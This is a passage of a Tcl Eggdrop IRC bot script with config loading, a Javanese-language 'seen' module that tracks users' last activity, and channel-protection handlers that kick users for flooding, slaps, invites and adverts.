   global nick nickpass altpass altnick realname owner kops my-ip banner cycle_random
   global notc logstore cfgfile badwords advwords ban-time my-hostname kickclr awaybanner
   if {[validuser "config"]} {
      if {[getuser "config" XTRA "REALNAME"]!=""} {
         set realname [dezip [getuser "config" XTRA "REALNAME"]]
      } else {
         set realname [realnames]
      }
      if {[getuser "config" XTRA "USERNAME"]!=""} {
         set realname [dezip [getuser "config" XTRA "USERNAME"]]
      }
      if {[getuser "config" XTRA "NICK"]!=""} {
         set nick [dezip [getuser "config" XTRA "NICK"]]
      }
      if {[getuser "config" XTRA "NICKPASS"]!=""} {
         set nickpass [dezip [getuser "config" XTRA "NICKPASS"]]
      }
      if {[getuser "config" XTRA "ALTNICK"]!=""} {
         set altnick [dezip [getuser "config" XTRA "ALTNICK"]]
      }
      if {[getuser "config" XTRA "ALTPASS"]!=""} {
         set altpass [dezip [getuser "config" XTRA "ALTPASS"]]
      }
      if {[getuser "config" XTRA "BAN"]!=""} {
         set banner [dezip [getuser "config" XTRA "BAN"]]
         lappend cycle_random $banner
      }
      if {[getuser "config" XTRA "TeGaL"]!=""} {
         set awaybanner [dezip [getuser "config" XTRA "TeGaL"]]
      }
      if {[getuser "config" XTRA "BANTIME"]!=""} {
         set ban-time [getuser "config" XTRA "BANTIME"]
      }
      if {[getuser "config" XTRA "BADWORDS"]!=""} {
         set badwords [getuser "config" XTRA "BADWORDS"]
      }
      if {$badwords == ""} {
         set badwords ""
         setuser "config" XTRA "BADWORDS" $badwords
      }
      if {[getuser "config" XTRA "ADVWORDS"]!=""} {
         set advwords [getuser "config" XTRA "ADVWORDS"]
      }
      if {$advwords == ""} {
         set advwords ""
         setuser "config" XTRA "ADVWORDS" $advwords
      }
      if {[getuser "config" XTRA "KOPS"]!=""} {
         set kops "T"
      }
      if {[getuser "config" XTRA "KCLR"]!=""} {
         set kickclr "T"
      }
      if {[getuser "config" XTRA "VHOST"]!=""} {
         set my-hostname [getuser "config" XTRA "VHOST"]
         set my-ip [getuser "config" XTRA "VHOST"]
      }
      if {[getuser "config" XTRA "LOGCHAN"]!=""} { 
         putlog "!Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
         set logstore "${cfgfile}.log"
         logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
      }
   } else {
      adduser "config" ""
      chattr "config" "-hp"
   }
   foreach x [userlist] {
      chattr $x -Q
      if {$x != "config" && $x != "AKICK"} {
         foreach y [getuser $x HOSTS] {
            delhost $x $y
         }
         set hostmask "${x}!*@*"
         setuser $x HOSTS $hostmask
      }
   }
   if {![validuser "AKICK"]} {
      set hostmask "Guest*!*@*"
      adduser "AKICK" $hostmask
      chattr "AKICK" "-hp"
      chattr "AKICK" "K"
   }
   if {![validuser $owner]} {
      set hostmask "$owner!*@*"
      adduser $owner $hostmask
      chattr $owner "Zfhjmnoptx"
   }
   saveuser
}
utimer 1 {config}
utimer 2 {seen}
proc ack_act {nick uhost hand chan rest} {
   global botnick vern
   set elex $vern
   puthelp "NOTICE $nick :\001�10What8The4Fuck�\001"
   return 0
}
proc uncolor {s} {
   regsub -all --  $s "" s
   regsub -all --  $s "" s
   regsub -all --  $s "" s
   regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
   regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
   regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
   regsub -all -- \[0-9\],\[0-9\] $s "" s
   regsub -all -- \[0-9\]\[0-9\] $s "" s
   regsub -all -- \[0-9\] $s "" s
   return $s
}
proc msg_botset {unick uhost hand rest} {
   global nick nickpass altpass altnick own notc 
   if {$unick != $own} {
      return 0
   }
   puthelp "NOTICE $unick :1st $nick ($nickpass) 2nd $altnick ($altpass)"
   return 0
}
proc msg_reuser {nick uhost hand rest} {
   global botnick owner notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$nick != $owner} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   foreach x [userlist] {
      if {($x != "config") && ($x != "AKICK")} { deluser $x }
   }
   adduser $owner "$owner!*@*"
   chattr $owner "Zfhjmnoptx"
   puthelp "NOTICE $nick :Reseting UsER sucessfully, set pass 1st."
   saveuser
}
set bs(limit) 8000
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(flood) 4:15
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "language/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc seen {} {
   global version notc notd
   catch { unbind time - "12 * * * *" bs_timedsave }
   catch { unbind time -  "*1 * * * *" bs_trim }
   catch { unbind join -|- * bs_join_botidle }
   catch { unbind join -|- * bs_join }
   catch { unbind sign -|- * bs_sign }
   catch { unbind kick -|- * bs_kick }
   catch { unbind nick -|- * bs_nick }
   catch { unbind splt -|- * bs_splt }
   catch { unbind rejn -|- * bs_rejn }
   catch { unbind chjn -|- * bs_chjn }
   catch { unbind chpt -|- * bs_chpt }
   catch { unbind bot -|- bs_botsearch bs_botsearch }
   catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
   catch { unbind pub -|- [string trim "!"]seen pub_seen }
   catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
   catch { unbind pub - .ping public_ping }
   catch { unbind part -|- * bs_part_oldver }
   catch { unbind chof -|- * bs_chof }
   set mSEEN "F"
   foreach x [channels] {
      set cinfo [channel info $x]
      if {[string match "*+seen*" $cinfo]} {
         set mSEEN "T"
      }
   }
   if {$mSEEN == "F"} {return 0}
   bind time - "12 * * * *" bs_timedsave
   bind time -  "*1 * * * *" bs_trim
   bind join -|- * bs_join_botidle
   bind join -|- * bs_join
   bind sign -|- * bs_sign
   bind kick -|- * bs_kick
   bind nick -|- * bs_nick
   bind splt -|- * bs_splt
   bind rejn -|- * bs_rejn
   bind chjn -|- * bs_chjn
   bind chpt -|- * bs_chpt
   bind bot -|- bs_botsearch bs_botsearch
   bind bot -|- bs_botsearch_reply bs_botsearch_reply
   bind pub -|- !seen pub_seen
   bind pub -|- !seennick bs_pubreq2
   bind pub - .ping public_ping
   if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
   if {[string trimleft [lindex $version 1] 0] >= 1050000} {
      bind part -|- * bs_part  
   } {
      if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
      bind part -|- * bs_part_oldver
   }
   foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
   if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
   if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
   if {[info exists bs_list]} {
      if {[info exists bs(oldver)]} {
         if {$bs(oldver) < $bs(updater)} {bs_update}
      } {bs_update}
   }
}
utimer 2 seen
proc bs_filt {data} {
   regsub -all -- \\\\ $data \\\\\\\\ data 
   regsub -all -- \\\[ $data \\\\\[ data 
   regsub -all -- \\\] $data \\\\\] data
   regsub -all -- \\\} $data \\\\\} data 
   regsub -all -- \\\{ $data \\\\\{ data 
   regsub -all -- \\\" $data \\\\\" data 
   return $data
}
proc bs_flood_init {} {
   global bs bs_flood_array 
   if {![string match *:* $bs(flood)]} {return}
   set bs(flood_num) [lindex [split $bs(flood) :] 0]
   set bs(flood_time) [lindex [split $bs(flood) :] 1]
   set i [expr $bs(flood_num) - 1]
   while {$i >= 0} {
      set bs_flood_array($i) 0 
      incr i -1  
   }
} 
bs_flood_init
proc bs_flood {nick uhost} {
   global bs bs_flood_array 
   if {$bs(flood_num) == 0} {return 0} 
   set i [expr $bs(flood_num) - 1]
   while {$i >= 1} {
      set bs_flood_array($i) $bs_flood_array([expr $i - 1]) 
      incr i -1
   } 
   set bs_flood_array(0) [unixtime]
   if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
      if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)} 
      return 1
   } {return 0}
}
proc bs_read {} {
   global bs_list userfile bs
   if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
      set temp [split $userfile /] 
      set temp [lindex $temp [expr [llength $temp]-1]] 
      set name [lindex [split $temp .] 0]
   }
   if {![file exists $bs(path)bs_data.$name]} {
      if {![file exists $bs(path)bs_data.$name.bak]} {
         return
      } {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name}
   }
   set fd [open $bs(path)bs_data.$name r]
   set bsu_ver "" 
   set break 0
   while {![eof $fd]} {
      set inp [gets $fd] 
      if {[eof $fd]} {break} 
      if {[string trim $inp " "] == ""} {continue}
      if {[string index $inp 0] == "#"} {
         set bsu_version [string trimleft $inp #] 
         continue
      }
      if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
         if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
         if {$temp || [bsu_go] || [bsu_finish]} {
            rehashing
         }
         set break 1 
         break
      }
      set nick [lindex $inp 0] 
      set bs_list([string tolower $nick]) $inp
   }
   close $fd
   if {$break} {bs_read}
}
proc bs_update {} {
   global bs
   bs_save 
   bs_read
}
proc bs_timedsave {min b c d e} {bs_save}
proc bs_save {} {
   global bs_list userfile bs notc
   if {[array size bs_list] == 0} {return}
   if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
      set temp [split $userfile /] 
      set temp [lindex $temp [expr [llength $temp]-1]] 
      set name [lindex [split $temp .] 0]
   }
   if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
   set fd [open $bs(path)bs_data.$name w] 
   set id [array startsearch bs_list] 
   puts $fd "#$bs(updater)"
   while {[array anymore bs_list $id]} {
      set item [array nextelement bs_list $id] 
      puts $fd "$bs_list($item)"
   } 
   array donesearch bs_list $id
   close $fd
}
proc bs_part_oldver {a b c d} {bs_part $a $b $c $d ""}
proc bs_part {nick uhost hand chan reason} {
   if {[string tolower $chan] == "#TeGaL"} { 
      set chan "-secret-"
   }
   bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"
}
proc bs_join {nick uhost hand chan} {
   if {[string tolower $chan] == "#TeGaL"} { 
      set chan "-secret-"
   }
   bs_add $nick "[list $uhost] [unixtime] join $chan"
}
proc bs_sign {nick uhost hand chan reason} {
   if {[string tolower $chan] == "#TeGaL"} { 
      set chan "-secret-"
   }
   bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"
}
proc bs_kick {nick uhost hand chan knick reason} {
   set schan $chan
   if {[string tolower $chan] == "#TeGaL"} { 
      set schan "-secret-"
   }
   bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]"
}
proc bs_nick {nick uhost hand chan newnick} {
   if {[string tolower $chan] == "#yobayat"} { 
      set chan "-secret-"
   }
   set time [unixtime] 
   bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" 
   bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"
}
proc bs_splt {nick uhost hand chan} {
   if {[string tolower $chan] == "#yobayat"} { 
      set chan "-secret-"
   }
   bs_add $nick "[list $uhost] [unixtime] splt $chan"
}
proc bs_rejn {nick uhost hand chan} {
   if {[string tolower $chan] == "#yobayat"} { 
      set chan "-secret-"
   }
   bs_add $nick "[list $uhost] [unixtime] rejn $chan"
}
proc bs_chjn {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc bs_chpt {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc bs_botsearch {from cmd args} {
   global botnick notc
   set args [join $args]
   set command [lindex $args 0] 
   set target [lindex $args 1] 
   set nick [lindex $args 2] 
   set search [bs_filt [join [lrange $args 3 e]]]
   if {[string match *\\\** $search]} {
      set output [bs_seenmask bot $nick $search]
      if {$output != "belum ada dalam database seen saya." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
   } {
      set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
      if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
   }
}
proc bs_botsearch_reply {from cmd args} {
   global notc bs
   set args [join $args]
   if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
   if {![info exists bs(bot_delay)]} {
      set bs(bot_delay) on 
      utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
      if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {
         puthelp "[lindex $args 1] :[join [lindex $args 2]]"
      }
   }
}
proc pub_seen {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc bs_pubreq2 {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc bs_pubreq {nick uhost hand chan args no} {
   global botnick bs notc
   if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
   if {[bs_flood $nick $uhost]} {return 0}
   set i 0 
   if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
   if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
   set args [bs_filt [join $args]]
   set target "NOTICE $nick"
   if {[string match *\\\** [lindex $args 0]]} {
      set output [bs_seenmask $chan $hand $args]
      if {$output == "Rung duwe datane nda..!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
      if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
      regsub -all -- ~ $output "" output
      puthelp "$target :$nick, $output"
      return $bs(logqueries)
   }
   set data [bs_filt [string trimright [lindex $args 0] ?!.,]]
   if {[string tolower $nick] == [string tolower $data]} {
      puthelp "$target :$nick, rasah nggayaaa.. mbok yo jangan cari perhatian lah... huh dasar caper!!!!" 
      return $bs(logqueries)
   }
   if {[string tolower $data] == [string tolower $botnick] } {
      puthelp "$target :\001ACTION Diriku diciniii....!!!\001" 
      return $bs(logqueries)
   }
   if {[onchan $data $chan]} {
      puthelp "$target :itu loh $nick, sih $data lagi nongkrong, apa kurang jelas nicknya!!!" 
      return $bs(logqueries)
   }
   set output [bs_output $chan $nick $data $no] 
   if {$output == 0} {return 0}
   if {[lrange [split $output] 1 4] == "Aku rung reti ki, sopo si $nick kui??"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
   regsub -all -- ~ $output "" output
   puthelp "$target :$nick, $output"
   return $bs(logqueries)
}
proc bs_output {chan nick data no} {
   global botnick bs version bs_list
   set data [string tolower [string trimright [lindex $data 0] ?!.,]]
   if {$data == ""} {return 0}
   if {[string tolower $nick] == $data} {return [concat $nick, rasah kemakiii.. nggaya.. prengas prenges... huuu...]}
   if {$data == [string tolower $botnick]} {return [concat $nick, Aku disini say!]}
   if {[string length $data] > $bs(nicksize)} {return 0} 
   if {$bs(smartsearch) != 1} {set no 1}
   if {$no == 0} {
      set matches ""
      set hand ""
      set addy ""
      if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
         set addy [lindex $bs_list([string tolower $data]) 1] 
         set hand [finduser $addy]
         foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
      }
      if {[validuser $data]} {set hand $data}
      if {$hand != "*" && $hand != ""} {
         if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
         foreach addr $hosts {
            foreach item [string tolower [bs_seenmask dcc ? $addr]] {
               if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
            }
         }
      }
      if {$matches != ""} {
         set matches [string trimleft $matches " "]
         set len [llength $matches]
         if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
         if {$len > 99} {return [concat Aku menemukan sekitar $len data yang cocok, mbok yen nggolei sek eneng wae..]}
         set matches [bs_sort $matches]
         set key [lindex $matches 0]
         if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
         if {$len <= 5} {
            set output [concat Aku menemukan sekitar $len data yang cocok: [join $matches].]
            set output [concat $output  [bs_search $chan $key]] 
            return $output
         } {
            set output [concat Aku menemukan sekitar $len data yang cocok. 5 data paling akhir: [join [lrange $matches 0 4]].]
            set output [concat $output [bs_search $chan $key]] 
            return $output
         }
      }
   }
   set temp [bs_search $chan $data]
   if {$temp != 0} { return $temp } {
      #$data not found in $bs_list, so search userfile
      if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { 
         return "saya belum pernah melihat $data."
      } {
         set seen [getuser $data laston]
         if {[getuser $data laston] == ""} {return "$data durung eneng no datane say.."}
         if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
            set chan "-secret-"
         } {
            set chan [lindex $seen 1]
         }
         return [concat $nick, terakhir aku reti $data ono ning $chan [bs_when [lindex $seen 0]] mau.]
      }
   }
}
proc bs_search {chan n} {
   global bs_list notc 
   if {![info exists bs_list]} {return 0}
   if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
      set data [split $bs_list([string tolower $n])]
      set n [join [lindex $data 0]] 
      set addy [lindex $data 1] 
      set time [lindex $data 2] 
      set marker 0
      if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
         set chan "-secret-"
      } {
         set chan [lindex $data 4]
      }
      switch -- [lindex $data 3] {
         part { 
            set reason [lrange $data 5 e]
            if {$reason == "{}"} {set reason ""} {set reason " alasan e \"$reason\"."}
            set output [concat $n ($addy) terakhir saya lihat dia meninggalkan $chan [bs_when $time] yang lalu $reason] 
         }
         quit { 
            set reason [lrange $data 5 e]
            if {$reason == "Quit: {{}}"} {set reason ""} {set reason "$reason"}
            set output [concat $n ($addy) terakhir saya lihat dia keluar dari irc [bs_when $time] dengan pesan ($reason)] 
         }
         kick {
            set output [concat $n ($addy) di tendang karo [lindex $data 5] [bs_when $time] mau, nganggo pesen ([join [lrange $data 6 e]]).] 
         }
         rnck {
            set output [concat $n ($addy) ganti nick anyar dadi [lindex $data 5] no [lindex $data 4] [bs_when $time] mau.] 
            if {[validchan [lindex $data 4]]} {
               if {[onchan $n [lindex $data 4]]} {
                  set output [concat $output $n wonge isih no kene.]
               } {
                  set output [concat $output ora eneng no kene saiki.]
               }
            }
         }
         nick { 
            set output [concat $n ($addy) ganti nick anyar dadi [lindex $data 5] no [lindex $data 4] [bs_when $time] mau.]
         }
         splt { 
            set output [concat $n ($addy) metu soko $chan mergo split [bs_when $time] mau.] 
         }
         rejn { 
            set output [concat $n ($addy) bali meneh neng $chan bar keneng split [bs_when $time] mau.]
            if {[validchan $chan]} {
               if {[onchan $n $chan]} {
                  set output [concat $output $n isih no channel $chan.]
               } {
                  set output [concat $output Aku durung tau reti $n no channel $chan saiki.]
               }
            }
         }
         join { 
            set output [concat $n ($addy) mlebu channel $chan [bs_when $time] mau.]
            if {[validchan $chan]} {
               if {[onchan $n $chan]} {
                  set output [concat $output  $n isih no kene ko.]
               } {
                  set output [concat $output  durung tau reti $n no kene aku.]
               }
            }
         }
         away {
            set reason [lrange $data 5 e]
            if {$reason == ""} {
               set output [concat $n ($addy) bali mlebu channel $chan [bs_when $time] mau.]
            } {
               set output [concat $n ($addy) lagi away nganggo pesen ($reason) no $chan [bs_when $time] mau.]
            }
         }
         chon { 
            set output [concat $n ($addy) bali [bs_when $time] mau.] 
            set lnick [string tolower $n]
            foreach item [whom *] {
               if {$lnick == [string tolower [lindex $item 0]]} {
                  set output [concat $output $n eneng no kene saiki.] 
                  set marker 1
                  break
               }
            }
            if {$marker == 0} {
               set output [concat $output  I don't see $n on the partyline now, though.]
            }
         }
         chof { 
            set output [concat $n ($addy) leaving the partyline [bs_when $time] yang lalu.] 
            set lnick [string tolower $n]
            foreach item [whom *] {
               if {$lnick == [string tolower [lindex $item 0]]} {
                  set output [concat $output $n is on the partyline in [lindex $item 1] still.] 
                  break
               }
            }
         }
         chjn { 
            set output [concat $n ($addy) joining the partyline on $chan [bs_when $time] yang lalu.] 
            set lnick [string tolower $n]
            foreach item [whom *] {
               if {$lnick == [string tolower [lindex $item 0]]} {
                  set output [concat $output  $n is on the partyline right now.] 
                  set marker 1
                  break
               }
            }
            if {$marker == 0} {
               set output [concat $output  I don't see $n on the partyline now, though.]
            }
         }
         chpt { 
            set output [concat $n ($addy) leaving the partyline from $chan [bs_when $time] yang lalu.] 
            set lnick [string tolower $n]
            foreach item [whom *] {
               if {$lnick == [string tolower [lindex $item 0]]} {
                  set output [concat $output  $n is on the partyline in [lindex $item 1] still.] 
                  break
               }
            }
         }
         default {set output "error"}
      }
      return $output
   } {return 0}
}
proc bs_when {lasttime} {
   set years 0 
   set days 0 
   set hours 0 
   set mins 0 
   set time [expr [unixtime] - $lasttime]
   if {$time < 60} {return "mung $time detik"}
   if {$time >= 31536000} {
      set years [expr int([expr $time/31536000])]
      set time [expr $time - [expr 31536000*$years]]
   }
   if {$time >= 86400} {
      set days [expr int([expr $time/86400])]
      set time [expr $time - [expr 86400*$days]]
   }
   if {$time >= 3600} {
      set hours [expr int([expr $time/3600])]
      set time [expr $time - [expr 3600*$hours]]
   }
   if {$time >= 60} {
      set mins [expr int([expr $time/60])]
   }
   if {$years == 0} {
      set output ""
   } elseif {$years == 1} {
      set output "1 tahun,"
   } {
      set output "$years tahun,"
   }
   if {$days == 1} {lappend output "1 dino,"} elseif {$days > 1} {lappend output "$days dino,"}
   if {$hours == 1} {lappend output "1 jam,"} elseif {$hours > 1} {lappend output "$hours jam,"}
   if {$mins == 1} {lappend output "1 menit"} elseif {$mins > 1} {lappend output "$mins menit"}
   return [string trimright [join $output] ", "]
}
proc bs_add {nick data} {
   global bs_list bs
   if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
   set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc bs_lsortcmd {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc bs_trim {min h d m y} {
   global bs bs_list
   if {![info exists bs_list] || ![array exists bs_list]} {return} 
   set list [array names bs_list] 
   set range [expr [llength $list] - $bs(limit) - 1] 
   if {$range < 0} {return}
   set list [lsort -increasing -command bs_lsortcmd $list] 
   foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc bs_seenmask {ch nick args} {
   global bs_list bs notc
   set matches "" 
   set temp "" 
   set i 0 
   set args [join $args] 
   set chan [lindex $args 1]
   if {$chan != "" && [string trimleft $chan #] != $chan} {
      if {![validchan $chan]} {return "I'm not on $chan."} {set chan [string tolower $chan]}
   } { 
      set chan "" 
   }
   if {![info exists bs_list]} {return "durung tau namati cah kui."} 
   set data [bs_filt [string tolower [lindex $args 0]]]
   set maskfix 1
   while $maskfix {
      set mark 1
      if [regsub -all -- \\?\\? $data ? data] {set mark 0}
      if [regsub -all -- \\*\\* $data * data] {set mark 0}
      if [regsub -all -- \\*\\? $data * data] {set mark 0}
      if [regsub -all -- \\?\\* $data * data] {set mark 0}
      if $mark {break}
   }
   set id [array startsearch bs_list]
   while {[array anymore bs_list $id]} {
      set item [array nextelement bs_list $id] 
      if {$item == ""} {continue} 
      set i 0
      set temp ""
      set match [lindex $bs_list($item) 0] 
      set addy [lindex $bs_list($item) 1]
      if {[string match $data $item![string tolower $addy]]} {
         set match [bs_filt $match] 
         if {$chan != ""} {
            if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
         } {set matches [concat $matches $match]}
      }
   }
   array donesearch bs_list $id
   set matches [string trim $matches " "]
   if {$nick == "?"} {return [bs_filt $matches]}
   set len [llength $matches]
   if {$len == 0} {return "durung eneng no dataku."}
   if {$len == 1} {return [bs_output $ch $nick $matches 1]}
   if {$len > 99} {return "Aku nemokne sekitar $len data seng cocok, mbok nggolei sek eneng wae.."}
   set matches [bs_sort $matches]
   if {$len <= 5} {
      set output [concat Aku nemokne sekitar $len data seng cocok (sorted): [join $matches].]
   } {
      set output "Aku nemokne sekitar $len data seng cocok. 5 data paling akhir (sorted): [join [lrange $matches 0 4]]."
   }
   return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
}
proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc bs_join_botidle {nick uhost hand chan} {
   global bs_botidle botnick notc
   if {$nick == $botnick} {
      set bs_botidle([string tolower $chan]) [unixtime]
   }
}
proc public_ping {nick uhost hand chan rest} {
   global pingchan
   if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
   if {![info exists pingchan($nick)]} {
      set pingchan($nick) $chan 
   }
   puthelp "PRIVMSG $nick :\001PING [unixtime]\001"
   return 0
}
bind pubm - * repeat_pubm
bind ctcp - ACTION action_chk
proc action_chk {nick host hand chan keyword arg} {
   global botnick
   if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
   if {[matchattr $nick Z]} {
      set arg "`$arg"
   }
   if {![validchan $chan]} {
      msg_prot $nick $host $hand $arg
   } {
      repeat_pubm $nick $host $hand $chan $arg
      pum_arg $nick $host $hand $chan $arg
   }
}
proc repeat_pubm {nick uhost hand chan text} {
   global repeat_last botnick notb notc kops ps owner ismaskhost is_m
   global botnick capsnick deopme repeat_person quick bannick notm yealnick
   regsub -all -- \" $text "" text
   regsub -all -- \{ $text "" text
   regsub -all -- \} $text "" text
   pub_Z $nick $uhost $hand $chan $text
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   set real $text
   set text [uncolor $text]
   if {$nick == "ChanServ"} {
      if {[string match "*has deopped $botnick*" $text]} {
         if {![matchattr [lindex $text 0] f]} { 
            if {[matchattr $cflag D]} {
               set deopme [lindex $text 0]
            }
         }
      }
      return 0
   }
   if {[matchattr $nick f]} { return 0 }
   set mhost [string range $uhost [string first "@" $uhost] end]
   if {$nick == $botnick} { return 0 }
   set resume "T"
   if {[string match "*-greet*" [channel info $chan]]} { 
      set resume "F" 
   }
   if {![isop $botnick $chan]} { 
      set resume "F" 
   }
   if {![info exists kops]} {
      if {[isop $nick $chan]} { 
         set resume "F" 
      }
      if {[isvoice $nick $chan]} { 
         set resume "F" 
      }
   }
   if {[string tolower [lindex $text 0]] == "slaps"} {
      if {$resume == "F"} { return 0 }
      if {[lindex $text 1] == $botnick} {
         putserv "PRIVMSG $chan :\001ACTION slaps $nick around a bit with a large trout"
         putserv "KICK $chan $nick :1SeLF 4SLaPS 1PRoTECTION!!"
         return 0
      }
      if {[matchattr [lindex $text 1] n]} {
         putserv "KICK $chan $nick :1DoNT 4SLaPS1 my ADmIN!!"
         return 0
      }
      if {[matchattr [lindex $text 1] f]} {
         putserv "KICK $chan $nick :1DoNT 4SLaPS1 my FrieNd!!"
         return 0
      }
      if {[matchattr [lindex $text 1] m]} {
         putserv "KICK $chan $nick :1DoNT 4SLaPS1 my MaSTER!!"
      }
      return 0
   }
   # Tsunami Flood PRoTECTION
   if {[string length $text] > 100} {
      set chr 0
      set cnt 0
      while {$cnt < [string length $real]} {
         if [isflood [string index $real $cnt]] {
            incr chr
         }
         incr cnt
      }
      if {$chr > 30} {
         if {$resume == "T"} {
            set bannick($nick) "*!*$mhost"
            if {![isutimer "TsunamI $chan"]} {
               utimer 30 [list putlog "TsunamI $chan"]
            } elseif {[info exists ismaskhost]} {
               set bannick($nick) [maskhost "*!*$mhost"]
            }
            if {$quick == "1" && ![info exists is_m($chan)]} {
               putquick "KICK $chan $nick :1ABusINg 4TsunamI"
            } {
               putserv "KICK $chan $nick :1ABuSING 4TsunamI"
            }
         }
         return 0
      }
   }
   if {![info exists kops]} {
      if {$resume == "F"} { return 0 }
   }
   if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} {
      putserv "KICK $chan $nick :Jangan ngaco ach..!"
      return 0
   }
   if {[string match "*decode*" [string tolower $text]]} {
      set bannick($nick) "$nick!*@*"
      putserv "KICK $chan $nick :4DecOdE1 DeNIaL"
      return 0
   }
   if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
      foreach x [channels] {
         set chksiton [string tolower $x]
         if {[string match "*$chksiton*" [string tolower $text]]} { return }
      }
      foreach seekchan $text {
         if {[string match "*#*" $seekchan]} {
            putserv "KICK $chan $nick :1DonT 4InvITEd1"
            return 0
         }
      }
   }
   if {[string match "*http://asu*" [string tolower $text]] || [string match "*www.asu*.*" [string tolower $text]]} {
      putserv "KICK $chan $nick :1DonT 4AdvERTIsE1 IN 4[string toupper $chan] [banms]"
      return 0
   }
   if {[matchattr $cflag R]} {
      if {[info exists repeat_last($mhost$chan)]} {
         if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
